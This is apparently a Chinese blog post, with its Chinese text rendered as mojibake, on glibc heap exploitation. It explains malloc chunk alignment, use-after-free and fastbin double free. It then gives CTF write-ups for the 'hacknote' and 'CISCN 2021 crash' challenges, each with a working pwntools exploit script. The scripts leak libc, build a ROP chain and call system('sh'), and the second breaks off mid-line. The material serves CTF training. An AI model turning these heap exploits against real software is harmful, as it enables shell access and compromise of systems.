<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#  <span class="meta-keyword">define</span> MALLOC_ALIGNMENT       (2 *SIZE_SZ &lt; __alignof__ (long double)   </span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> MALLOC_ALIGN_MASK      (MALLOC_ALIGNMENT - 1)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* The smallest possible chunk */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> MIN_CHUNK_SIZE        (offsetof(struct malloc_chunk, fd_nextsize))</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* The smallest size we can malloc is an aligned minimal chunk */</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> MINSIZE  \</span></span><br><span class="line"><span class="meta">  (unsigned long)(((MIN_CHUNK_SIZE+MALLOC_ALIGN_MASK) &amp; ~MALLOC_ALIGN_MASK))</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* pad request bytes into a usable size -- internal version */</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> request2size(req)                                         \</span></span><br><span class="line"><span class="meta">  (((req) + SIZE_SZ + MALLOC_ALIGN_MASK &lt; MINSIZE)  ?             \</span></span><br><span class="line"><span class="meta">   MINSIZE :                                                      \</span></span><br><span class="line"><span class="meta">   ((req) + SIZE_SZ + MALLOC_ALIGN_MASK) &amp; ~MALLOC_ALIGN_MASK)</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">malloc_chunk</span> &#123;</span></span><br><span class="line"></span><br><span class="line">  INTERNAL_SIZE_T      prev_size;  <span class="comment">/* Size of previous chunk (if free).  */</span></span><br><span class="line">  INTERNAL_SIZE_T      size;       <span class="comment">/* Size in bytes, including overhead. */</span></span><br><span class="line"></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">malloc_chunk</span>* <span class="title">fd</span>;</span>         <span class="comment">/* double links -- used only if free. */</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">malloc_chunk</span>* <span class="title">bk</span>;</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Only used for large blocks: pointer to next larger size.  */</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">malloc_chunk</span>* <span class="title">fd_nextsize</span>;</span> <span class="comment">/* double links -- used only if free. */</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">malloc_chunk</span>* <span class="title">bk_nextsize</span>;</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>ç¿»è¯‘ç¿»è¯‘å°±æ˜¯mallocåœ¨å¯¹å…¶çš„æ—¶ä¾¯ï¼Œå…¶å¯¹å…¶å‚æ•°å¿…é¡»æ˜¯2çš„å¹‚ä¸”åœ¨32ä¸ºä¸‹8byte,64ä½ä¸‹ä¸º16byte</p>
<p>ä½†æ˜¯æœ€å°åˆ†é…å•ä½å¹¶ä¸æ˜¯å¯¹é½å•ä½ï¼Œæœ€å°åˆ†é…å•ä½MINSIZEï¼š</p>
<p>è®¡ç®—MINSIZE=ï¼ˆ16+8-1ï¼‰ &amp; ~ï¼ˆ8-1ï¼‰=16å­—èŠ‚</p>
<p>å³32ä½ä¸‹mallocçš„æœ€å°åˆ†é…å•ä½ä¸º16å­—èŠ‚ï¼Œ64ä½ä¸‹æœ€å°åˆ†é…å•ä½ä¸º32å­—èŠ‚ã€‚</p>
<p>å…¶ä¸­request2sizeå°±æ˜¯mallocçš„å†…å­˜å¯¹é½æ“ä½œã€‚</p>
<p>ä»request2sizeè¿˜å¯ä»¥çŸ¥é“ï¼Œå¦‚æœæ˜¯64ä½ç³»ç»Ÿï¼Œç”³è¯·å†…å­˜ä¸º1~24å­—èŠ‚æ—¶ï¼Œç³»ç»Ÿå†…å­˜æ¶ˆè€—32å­—èŠ‚ï¼Œå½“ç”³è¯·å†…å­˜ä¸º25å­—èŠ‚æ—¶ï¼Œç³»ç»Ÿå†…å­˜æ¶ˆè€—48å­—èŠ‚ã€‚ å¦‚æœæ˜¯32ä½ç³»ç»Ÿï¼Œç”³è¯·å†…å­˜ä¸º1~12å­—èŠ‚æ—¶ï¼Œç³»ç»Ÿå†…å­˜æ¶ˆè€—16å­—èŠ‚ï¼Œå½“ç”³è¯·å†…å­˜ä¸º13å­—èŠ‚æ—¶ï¼Œç³»ç»Ÿå†…å­˜æ¶ˆè€—24å­—èŠ‚ã€‚ï¼ˆç±»ä¼¼è®¡ç®—MINSIZEï¼‰</p>
<h3 id="UAF-çš„åˆ©ç”¨"><a class="header-anchor" href="#UAF-çš„åˆ©ç”¨">Â¶</a>UAF çš„åˆ©ç”¨</h3>
<p>å½“ç”³è¯·ä¸¤ä¸ªfastbinèŒƒå›´å†…çš„å †å—åï¼Œfastbinå¦‚ä¸‹å›¾æ‰€ç¤º</p>
<p><img src="http://static.zybuluo.com/hgggg/i7inxma7n1gx14yc77t3f824/31.png" alt="31.png-16.6kB"></p>
<p>æ­¤æ—¶å¯ä»¥åˆ©ç”¨UAFä¿®æ”¹chunk0çš„æŒ‡é’ˆï¼Œå½“æˆ‘ä»¬å†æ¬¡ç”³è¯·å‡ºè¿™ä¸¤ä¸ªå †çš„æ—¶å€™ï¼Œå°±å¯ä»¥ç”³è¯·åˆ°æƒ³è¦ä¿®æ”¹çš„åœ°å€å¤„,è¿›è¡Œåç»­çš„ä¸€äº›ä¿®æ”¹</p>
<h3 id="double-free"><a class="header-anchor" href="#double-free">Â¶</a>double free</h3>
<p>double free å’Œ UAF ä¸€æ ·åŒæ ·ä¹Ÿæ˜¯ç”±äºæŒ‡é’ˆä¸ºæ¸…ç©ºé€ æˆçš„æ¼æ´ï¼Œä¸UAFçš„æ¼æ´åˆ©ç”¨æ–¹å¼å·®ä¸å¤šï¼Œå¸¸è¢«ç”¨äºä¸fastbin attack ç»„åˆåˆ©ç”¨</p>
<p>ä¸‹é¢ä»‹ç»ä¸€ç§åˆ©ç”¨double free æ¥è¾¾åˆ°ä»»æ„åœ°å€å†™çš„åˆ©ç”¨æ–¹å¼</p>
<p>å½“ç”³è¯·ä¸¤ä¸ªå †å—å¹¶ä¸”é‡Šæ”¾æ—¶fastbinä¸­æœ‰å¦‚ä¸‹ç»“æ„ï¼š</p>
<pre><code>fastbin[Y] -&gt; chunk1 -&gt; chunk0
</code></pre>
<p>è€Œæ­¤æ—¶æˆ‘ä»¬å†æ¬¡é‡Šæ”¾chunk1</p>
<pre><code>fastbin[Y] -&gt; chunk0 -&gt;  &lt;- chunk1 
</code></pre>
<p>å¦‚æœæˆ‘ä»¬æ­¤æ—¶ç”³è¯·ä¸€ä¸ªæ–°çš„chunk</p>
<p><img src="http://static.zybuluo.com/hgggg/71qyoakamj0w6w0xbywxwzmp/32.png" alt="32.png-14.2kB"></p>
<p>æ­¤æ—¶ä¿®æ”¹new chunkçš„æŒ‡é’ˆ</p>
<p><img src="http://static.zybuluo.com/hgggg/fl430uwnapavh55zpng9hj8g/33.png" alt="33.png-19.6kB"></p>
<p>å†ç”³è¯·ä¸€ä¸ªchunk1</p>
<p><img src="http://static.zybuluo.com/hgggg/vevy3cstvblcgtha3rphjc9n/34.png" alt="34.png-17.1kB"></p>
<p>åœ¨ç”³è¯·ä¸€ä¸ªchunkåè¿™ä¸ªchunkå°±ä¼šåˆchunk1é‡åˆï¼Œä¸”fastbiné“¾è¡¨å·²ç»æŒ‡å‘äº†æˆ‘ä»¬æƒ³è¦ä¿®æ”¹çš„åœ°å€äº†ï¼Œåªè¦å†ç”³è¯·ä¸€ä¸ªå †å—å°±ä¼šç”³è¯·åˆ°æƒ³è¦ä¿®æ”¹çš„åœ°å€ï¼Œç„¶ååªè¦ç¼–è¾‘è¿™ä¸ªå †å—ä¾¿å¯å®Œæˆä»»æ„åœ°å€å†™ã€‚</p>
<p><img src="http://static.zybuluo.com/hgggg/wj1tdtf92h6wmo5khhpfl6st/35.png" alt="35.png-21.6kB"></p>
<h2 id="ä¾‹é¢˜"><a class="header-anchor" href="#ä¾‹é¢˜">Â¶</a>ä¾‹é¢˜</h2>
<h3 id="hacknote"><a class="header-anchor" href="#hacknote">Â¶</a>hacknote</h3>
<h4 id="IDA-åˆ†æ"><a class="header-anchor" href="#IDA-åˆ†æ">Â¶</a>IDA åˆ†æ</h4>
<p>add<br>
<img src="http://static.zybuluo.com/hgggg/6ptrl1aq1a1u68hla9ixm5pg/25.png" alt="25.png-60.2kB"></p>
<p>delete<br>
<img src="http://static.zybuluo.com/hgggg/2oqox20pffmb7diztd5htwkl/26.png" alt="26.png-44.3kB"></p>
<h4 id="åˆ©ç”¨æ€è·¯"><a class="header-anchor" href="#åˆ©ç”¨æ€è·¯">Â¶</a>åˆ©ç”¨æ€è·¯</h4>
<p><img src="http://static.zybuluo.com/hgggg/2n71il94qre8z0swlok1n29f/27.png" alt="27.png-77.8kB"></p>
<p>ç”±ä¸Šå›¾å¯ä»¥çœ‹åˆ°ï¼Œå½“æˆ‘ä»¬ç”³è¯·ä¸€ä¸ªnoteçš„æ—¶å€™ï¼Œæ­¤æ—¶å †å—çš„ç»“æ„å¦‚ä¸‹å›¾æ‰€ç¤º</p>
<p><img src="http://static.zybuluo.com/hgggg/z1bunz0mfb0mxrboc7tgftsy/28.png" alt="28.png-23.5kB"></p>
<p>å…·ä½“åˆ©ç”¨æ–¹å¼å¦‚ä¸‹</p>
<p>æˆ‘ä»¬ç”³è¯·ä¸¤ä¸ªnote,åœ¨è¿›è¡Œé‡Šæ”¾</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">add(<span class="number">0x20</span>,<span class="string">&#x27;aaaa&#x27;</span>)</span><br><span class="line">add(<span class="number">0x20</span>,<span class="string">&#x27;aaaa&#x27;</span>)</span><br><span class="line"></span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">delete(<span class="number">1</span>)</span><br></pre></td></tr></table></figure>
<p><img src="http://static.zybuluo.com/hgggg/fmih4vz2wd4oizhkb5tw9pm7/29.png" alt="29.png-24.9kB"></p>
<p>æ­¤æ—¶struct noteè¢«æ”¾åˆ°fastbin[0] , content è¢«æ”¾å…¥fastbin<a href="http://static.zybuluo.com/hgggg/fl430uwnapavh55zpng9hj8g/33.png">3</a></p>
<p>å¦‚æœæˆ‘ä»¬ç”³è¯·ä¸€ä¸ªå¤§å°åœ¨fastbin[0]èŒƒå›´å†…çš„å †note2,é‚£ä¹ˆnote2 çš„struct note å’Œ contentå°±ä¼šåˆ†åˆ«æ˜¯fastbin[0]ä¸­çš„note1,å’Œnote0çš„struct note</p>
<p>å› æ­¤æ–°å»ºçš„note2çš„strcut noteå°†è¢«åˆ†é…åˆ°note1çš„ç»“æ„ä½“ä½ç½®ï¼Œnote2çš„contentå°†è¢«åˆ†é…åˆ°note0çš„ç»“æ„ä½“ä½ç½®ï¼Œnote0å…«å­—èŠ‚çš„ç»“æ„ä½“å¤„åˆ†åˆ«å­˜æ”¾äº†æ‰“å°å‡½æ•°0x804862bå’Œå…¶å‚æ•°åœ°å€ï¼Œç°åœ¨å°†è¢«æˆ‘ä»¬è¾“å…¥çš„contentè¦†ç›–</p>
<p>å¦‚æœæˆ‘ä»¬å°†content è¦†ç›–ä¸º __libc_start_mainçš„åœ°å€ é‚£ä¹ˆæˆ‘ä»¬å°±å¯ä»¥æ³„éœ² libc äº† , åŒç†å¯ä»¥æ¢…å¼€äºŒåº¦getshell</p>
<p>è¿™é‡Œè¿˜æœ‰ä¸€ä¸ªå°å‘ï¼Œè¦†ç›–åsystemçš„å‚æ•°å®é™…ä¸Šæ˜¯ä»note0ç»“æ„ä½“å¼€å§‹çš„ï¼Œæ‰€ä»¥è¦ç”¨åˆ°systemå‚æ•°æˆªæ–­çš„å§¿åŠ¿ï¼Œå¦‚ï¼š&amp;&amp;shï¼Œ||shï¼Œ;sh;</p>
<p><img src="http://static.zybuluo.com/hgggg/76xhtazyt1dokdpz0a6xp6gv/30.png" alt="30.png-84kB"></p>
<p>å¯ä»¥çœ‹åˆ°æœ€åæˆåŠŸè°ƒç”¨äº†system(â€˜shâ€™)</p>
<h4 id="exp"><a class="header-anchor" href="#exp">Â¶</a>exp</h4>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#p = remote(&#x27;node4.buuoj.cn&#x27;,27510)</span></span><br><span class="line">p=process(<span class="string">&#x27;./hacknote&#x27;</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;/lib/i386-linux-gnu/libc.so.6&#x27;</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;hacknote&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span>(<span class="params">size,content</span>):</span></span><br><span class="line">	p.recvuntil(<span class="string">&#x27;Your choice :&#x27;</span>)</span><br><span class="line">	p.sendline(<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">	p.recvuntil(<span class="string">&#x27;Note size :&#x27;</span>)</span><br><span class="line">	p.sendline(<span class="built_in">str</span>(size))</span><br><span class="line">	p.recvuntil(<span class="string">&#x27;Content :&#x27;</span>)</span><br><span class="line">	p.send(content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete</span>(<span class="params">index</span>):</span></span><br><span class="line">	p.recvuntil(<span class="string">&#x27;Your choice :&#x27;</span>)</span><br><span class="line">	p.sendline(<span class="string">&#x27;2&#x27;</span>)</span><br><span class="line">	p.recvuntil(<span class="string">&#x27;Index :&#x27;</span>)</span><br><span class="line">	p.sendline(<span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span>(<span class="params">index</span>):</span></span><br><span class="line">	p.recvuntil(<span class="string">&#x27;Your choice :&#x27;</span>)</span><br><span class="line">	p.sendline(<span class="string">&#x27;3&#x27;</span>)</span><br><span class="line">	p.recvuntil(<span class="string">&#x27;Index :&#x27;</span>)</span><br><span class="line">	p.sendline(<span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line">libc_start_main = elf.got[<span class="string">&#x27;__libc_start_main&#x27;</span>]</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x20</span>,<span class="string">&#x27;aaaa&#x27;</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x20</span>,<span class="string">&#x27;aaaa&#x27;</span>)</span><br><span class="line"><span class="comment">#</span></span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line">gdb.attach(p)</span><br><span class="line">add(<span class="number">8</span>,p32(<span class="number">0x804862B</span>)+p32(libc_start_main))</span><br><span class="line">gdb.attach(p)</span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">libc_base = u32(p.recv(<span class="number">4</span>)) - <span class="number">0x18550</span> </span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(libc_base))</span><br><span class="line"></span><br><span class="line">system = libc_base + libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line"></span><br><span class="line">delete(<span class="number">2</span>)</span><br><span class="line">add(<span class="number">8</span>,p32(system)+<span class="string">b&#x27;||sh&#x27;</span>)</span><br><span class="line">gdb.attach(p)</span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
<h3 id="CISCN-2021-è¥¿å—èµ›åŒº-crash"><a class="header-anchor" href="#CISCN-2021-è¥¿å—èµ›åŒº-crash">Â¶</a>CISCN 2021 è¥¿å—èµ›åŒº crash</h3>
<p>è¿™ä¸ªé¢˜å’ŒHCTFçš„fheapï¼Œä¸èƒ½è¯´æ˜¯å®Œå…¨ç›¸åŒï¼Œåªèƒ½è¯´æ˜¯ä¸€æ¨¡ä¸€æ ·äº†ï¼Œä½†å½“æ—¶åªæœ‰ä¸¤ä¸ªé˜Ÿåšå‡ºæ¥</p>
<p>è¿™é“é¢˜åœ¨ç½‘ä¸Šçš„è§£æ³•ä¸€èˆ¬éƒ½æ˜¯UAFï¼Œè¿™é‡Œæä¾›ä¸€ç§double free + ret2csu çš„æ€è·¯</p>
<h4 id="ç¨‹åºåˆ†æ"><a class="header-anchor" href="#ç¨‹åºåˆ†æ">Â¶</a>ç¨‹åºåˆ†æ</h4>
<p>ADD</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">unsigned</span> __int64 <span class="title">add</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> i; <span class="comment">// [rsp+4h] [rbp-102Ch]</span></span><br><span class="line">  <span class="keyword">char</span> *ptr; <span class="comment">// [rsp+8h] [rbp-1028h]</span></span><br><span class="line">  <span class="keyword">char</span> *dest; <span class="comment">// [rsp+10h] [rbp-1020h]</span></span><br><span class="line">  <span class="keyword">size_t</span> nbytes; <span class="comment">// [rsp+18h] [rbp-1018h]</span></span><br><span class="line">  <span class="keyword">size_t</span> nbytesa; <span class="comment">// [rsp+18h] [rbp-1018h]</span></span><br><span class="line">  <span class="keyword">char</span> buf[<span class="number">4104</span>]; <span class="comment">// [rsp+20h] [rbp-1010h] BYREF</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v7; <span class="comment">// [rsp+1028h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v7 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  ptr = (<span class="keyword">char</span> *)<span class="built_in">malloc</span>(<span class="number">0x20</span>uLL);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Pls give data size:&quot;</span>);</span><br><span class="line">  nbytes = (<span class="keyword">int</span>)getInt();</span><br><span class="line">  <span class="keyword">if</span> ( nbytes &lt;= <span class="number">0x1000</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;data:&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> ( read(<span class="number">0</span>, buf, nbytes) == <span class="number">-1</span> )</span><br><span class="line">      <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">    nbytesa = <span class="built_in">strlen</span>(buf);</span><br><span class="line">    <span class="keyword">if</span> ( nbytesa &gt; <span class="number">0xF</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      dest = (<span class="keyword">char</span> *)<span class="built_in">malloc</span>(nbytesa);</span><br><span class="line">      <span class="keyword">if</span> ( !dest )</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">      <span class="built_in">strncpy</span>(dest, buf, nbytesa);</span><br><span class="line">      *(_QWORD *)ptr = dest;</span><br><span class="line">      *((_QWORD *)ptr + <span class="number">3</span>) = freeLong;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">strncpy</span>(ptr, buf, nbytesa);</span><br><span class="line">      *((_QWORD *)ptr + <span class="number">3</span>) = freeShort;</span><br><span class="line">    &#125;</span><br><span class="line">    *((_DWORD *)ptr + <span class="number">4</span>) = nbytesa;</span><br><span class="line">    <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt;= <span class="number">15</span>; ++i )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( !*((_DWORD *)&amp;Strings + <span class="number">4</span> * i) )</span><br><span class="line">      &#123;</span><br><span class="line">        *((_DWORD *)&amp;Strings + <span class="number">4</span> * i) = <span class="number">1</span>;</span><br><span class="line">        qword_2020E8[<span class="number">2</span> * i] = ptr;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;The string id is %d\n&quot;</span>, (<span class="keyword">unsigned</span> <span class="keyword">int</span>)i);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( i == <span class="number">16</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;The string list is full&quot;</span>);</span><br><span class="line">      (*((<span class="keyword">void</span> (__fastcall **)(<span class="keyword">char</span> *))ptr + <span class="number">3</span>))(ptr);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Invalid size&quot;</span>);</span><br><span class="line">    <span class="built_in">free</span>(ptr);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> __readfsqword(<span class="number">0x28</span>u) ^ v7;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>freeLong çš„æ±‡ç¼–ä»£ç å¦‚ä¸‹ï¼Œ freeShort å’Œ å®ƒå·®ä¸å¤šéƒ½å­˜åœ¨UAF</p>
<p><img src="http://static.zybuluo.com/hgggg/mk8t3gtc5l76hghd8wst9ent/36.png" alt="36.png-28.6kB"></p>
<p>ä¸»è¦çš„æ¼æ´ç‚¹åœ¨Delete</p>
<p><img src="http://static.zybuluo.com/hgggg/0kdpfqzbu2bg4gev9rppwe3w/37.png" alt="37.png-48.5kB"></p>
<h4 id="åˆ©ç”¨æ–¹å¼"><a class="header-anchor" href="#åˆ©ç”¨æ–¹å¼">Â¶</a>åˆ©ç”¨æ–¹å¼</h4>
<pre><code>    IDA ä¸­å¯ä»¥çœ‹åˆ° call puts ä¸ freeShort å’Œ freeLongåœ¨åŒä¸€
é¡µï¼Œè¿™æ ·çš„è¯å¦‚æœæˆ‘ä»¬å¯ä»¥åˆ©ç”¨double freeè¦†ç›–freeLongçš„åœ°å€çš„åä¸¤ä½
ä¸ºcall putsçš„åœ°å€,å½“æˆ‘ä»¬deleteçš„æ—¶å€™å°±ä¼šè°ƒç”¨call puts æ‰“å°å‡ºå­—ç¬¦
ä¸²åœ°å€å¼€å§‹çš„å†…å®¹ï¼Œcall puts çš„åœ°å€å°±åœ¨è¿™ä¸²å†…å®¹é‡Œï¼Œè¿™æ ·å¯ä»¥æ³„éœ²ç¨‹åº
åŸºå€ã€‚

æ‹¿åˆ°ç¨‹åºåœ°å€ä¹‹åå°±å¯ä»¥ç»“åˆdouble free åˆ©ç”¨deleteçš„é‡Œæº¢å‡ºæ¥ret2csu

bssæ®µæ²¡æœ‰è¶³å¤Ÿçš„ç©ºé—´æ¥å†™å…¥/bin/shæ‰€ä»¥è¦å¾€dataæ®µå†™
</code></pre>
<p>å…·ä½“ä¸å¤šè¯´(<s>ä¸»è¦æ˜¯æ‡’</s>)ï¼šç›´æ¥ä¸Šexp</p>
<h4 id="exp-v2"><a class="header-anchor" href="#exp-v2">Â¶</a>exp</h4>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> os <span class="keyword">import</span> system</span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">p  = process(<span class="string">&quot;crash&quot;</span>)</span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">libc = ELF(<span class="string">&#x27;libc-2.23.so&#x27;</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;crash&#x27;</span>)</span><br><span class="line"><span class="comment">#p = remote(&#x27;192.168.43.181&#x27;,55000)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span>(<span class="params">size,data</span>):</span></span><br><span class="line">    p.sendline(<span class="string">&#x27;add &#x27;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;Pls give data size:&#x27;</span>,<span class="built_in">str</span>(size))</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;data:&#x27;</span>,data)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">dele</span>(<span class="params">idx</span>):</span></span><br><span class="line">    p.sendline(<span class="string">&#x27;delete &#x27;</span>)</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;id:&#x27;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(idx))</span><br><span class="line">    p.sendafter(<span class="string">&#x27;Are you sure?:&#x27;</span>,<span class="string">&#x27;yes&#x27;</span>)</span><br><span class="line">    </span><br><span class="line"></span><br><span class="line">add(<span class="number">4</span>,<span class="string">&#x27;aaa&#x27;</span>) </span><br><span class="line">add(<span class="number">4</span>,<span class="string">&#x27;aaa&#x27;</span>) </span><br><span class="line"></span><br><span class="line">dele(<span class="number">0</span>)</span><br><span class="line">dele(<span class="number">1</span>)</span><br><span class="line">dele(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x20</span>,<span class="string">&#x27;\x00&#x27;</span>)  </span><br><span class="line">add(<span class="number">0x20</span>,<span class="string">b&#x27;c&#x27;</span>*<span class="number">0x18</span>+<span class="string">b&#x27;\x0b\x00&#x27;</span>) </span><br><span class="line">dele(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">b&#x27;c&#x27;</span>*<span class="number">0x18</span>)</span><br><span class="line">elf_base = u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>)) - <span class="number">0xd0b</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(elf_base))</span><br><span class="line"></span><br><span class="line">dele(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">0x000000000000119c : pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret</span></span><br><span class="line"><span class="string">0x000000000000119e : pop r13 ; pop r14 ; pop r15 ; ret</span></span><br><span class="line"><span class="string">0x00000000000011a0 : pop r14 ; pop r15 ; ret</span></span><br><span class="line"><span class="string">0x00000000000011a2 : pop r15 ; ret</span></span><br><span class="line"><span class="string">0x000000000000119b : pop rbp ; pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret</span></span><br><span class="line"><span class="string">0x000000000000119f : pop rbp ; pop r14 ; pop r15 ; ret</span></span><br><span class="line"><span class="string">0x0000000000000a80 : pop rbp ; ret</span></span><br><span class="line"><span class="string">0x00000000000011a3 : pop rdi ; ret</span></span><br><span class="line"><span class="string">0x00000000000011a1 : pop rsi ; pop r15 ; ret</span></span><br><span class="line"><span class="string">0x000000000000119d : pop rsp ; pop r13 ; pop r14 ; pop r15 ; ret</span></span><br><span class="line"><span class="string">0x0000000000000929 : ret</span></span><br><span class="line"><span class="string">0x0000000000000962 : ret 0x2016</span></span><br><span class="line"><span class="string">0x000000000000102b : ret 0x8b48</span></span><br><span class="line"><span class="string">0x0000000000000dd2 : ret 0x8d48</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line">pop_rdi = elf_base + <span class="number">0x11a3</span></span><br><span class="line">puts_plt = elf_base + elf.plt[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">puts_got = elf_base + elf.got[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">main = elf_base + elf.sym[<span class="string">&#x27;main&#x27;</span>]</span><br><span class="line">pop_4 = elf_base + <span class="number">0x119c</span></span><br><span class="line">read_got = elf_base + elf.got[<span class="string">&#x27;read&#x27;</span>]</span><br><span class="line">pop_6 = elf_base + <span class="number">0x119a</span></span><br><span class="line">rop2 = elf_base + <span class="number">0x1180</span></span><br><span class="line">bin_sh = elf_base + <span class="number">0x202080</span> </span><br><span class="line"></span><br><span class="line">add(<span class="number">0x4</span>,<span class="string">b&#x27;\x00&#x27;</span>)  <span class="comment">#1</span></span><br><span class="line">add(<span class="number">0x20</span>,<span class="string">b&#x27;d&#x27;</span>*<span class="number">0x18</span>+p64(pop_4)) <span class="comment">#0</span></span><br><span class="line">payload1 = p64(pop_rdi)+p64(puts_got)+p64(puts_plt)+p64(pop_6)+p64(<span class="number">0</span>)+p64(<span class="number">1</span>)+p64(read_got)+p64(<span class="number">8</span>)+p64(bin_sh)+p64(<span class="number">0</span>)+p64(rop2)+<span class="string">b&#x27;\x00&#x27;</span>*<span class="number">56</span>+p64(main)</span><br><span class="line"></span><br><span class="line">payload1 = <span class="string">b&quot;yes\x00\x00\x00\x00\x00&quot;</span> + payload1</span><br><span class="line"></span><br><span class="line">p.sendline(<span class="string">&#x27;delete &#x27;</span>)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;id:&#x27;</span>)</span><br><span class="line">p.sendline(<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;Are you sure?:&#x27;</span>)</span><br><span class="line">p.send(payload1)</span><br><span class="line">puts_addr = u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">libc_base = puts_addr - libc.sym[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">system_addr = libc_base + libc.symbols[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">p.send(<span class="string">b&quot;/bin/sh\x00&quot;</span>)</span><br><span class="line"></span><br><span class="line">dele(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x4</span>,<span class="string">b&#x27;\x00&#x27;</span>) <span class="comment">#1</span></span><br><span class="line">add(<span class="number">0x20</span>,<span 